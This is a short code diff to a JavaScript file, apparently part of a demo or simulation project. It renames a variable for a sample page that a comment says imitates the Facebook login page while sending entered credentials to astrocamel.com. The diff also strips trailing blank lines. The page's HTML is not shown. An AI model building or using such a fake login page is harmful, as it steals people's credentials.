@@ -23,7 +23,7 @@ function webpage(url, src) {
 * A sample webpage which simulates the Facebook login page
 * but insteads sends the credentials to astrocamel.com
 */
-var facebook_face_page = new webpage("http://www.facebook.com",
+var facebook_fake_page = new webpage("http://www.facebook.com",
 					function() {/*!
 <!DOCTYPE html>
 <html id="facebook" class="tinyViewport" lang="en">
@@ -629,7 +629,3 @@ for a celebrity, band or business.
 </html>
 */}
 );
-
-
-
-
